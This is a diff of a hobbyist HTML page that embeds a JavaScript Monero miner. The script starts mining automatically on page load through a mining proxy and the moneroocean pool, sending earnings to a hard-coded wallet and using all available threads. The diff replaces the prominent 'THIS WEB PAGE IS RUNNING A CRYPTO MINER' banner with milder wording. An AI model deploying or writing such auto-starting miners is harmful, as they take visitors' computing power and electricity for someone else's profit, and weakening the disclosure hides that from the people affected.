@@ -1,14 +1,12 @@
 <!Doctype html>
 <html
 <body>
-<h1>THIS WEB PAGE IS RUNNING A CRYPTO MINER</h1>
-<p>This is a java script miner test</p>
-<p>This is just a small test to see if I can get a javascript miner to run</p>
-<p>go to my github for advice or click the "feedback" button in the bottom right</p>
-<p> the button bellow me should show current wallet info</p>
+<h1>This is a javascript miner!</h1>
+<p>This is a java script miner test to see if i can mine with javascript</p>
+<p>If chrome says higher cpu usage, then its working!</p>
 <script>
 let btn = document.createElement("button");
-btn.innerHTML = "Click for wallet stats";
+btn.innerHTML = "Click for stats";
 btn.onclick = function () {
   function makeHttpObject() {
   try {return new XMLHttpRequest();}
@@ -36,12 +34,11 @@ document.body.appendChild(btn);
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
     var walletAddress = "4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si";
-    var workerId = Math.floor(Math.random() * 10000);
+    var workerId = ""
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 20;
 </script>
 </body>
-</html> 
- 
+</html>
